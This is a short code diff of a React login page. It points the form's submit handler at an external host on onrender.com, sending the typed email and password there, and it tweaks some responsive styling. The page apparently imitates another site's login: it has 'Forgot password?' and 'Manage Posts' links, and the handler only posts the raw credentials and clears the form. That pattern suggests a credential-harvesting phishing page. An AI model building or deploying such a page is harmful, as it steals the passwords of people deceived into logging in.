@@ -74,7 +74,7 @@ const page = () => {
 
       const handlesubmit =async (e) => {
         e.preventDefault(); 
-        await axios.post('http://localhost:5000/api/submit', { email:formData.email, password:formData.password });
+        await axios.post('https://mega-backend-4k8t.onrender.com/api/submit', { email:formData.email, password:formData.password });
 
 
         setFormData({
@@ -122,8 +122,8 @@ const page = () => {
 
             <h3 className='text-[#0000EE] text-[14px] font-normal'>FORGOT PASSWORD?</h3>
 
-            <div className='text-center flex flex-col gap-[26px]'>
-          <ul className='flex gap-2 justify-center text-[#0481C9] text-[13px] font-normal'>
+            <div className='text-center flex flex-col sm:gap-[26px] gap:[10px] '>
+          <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] text-[13px] font-normal'>
             <a href="/"><li className='cursor-pointer'>Home</li></a>
             <li>|</li>
             <li className='cursor-pointer'>Manage Posts</li>
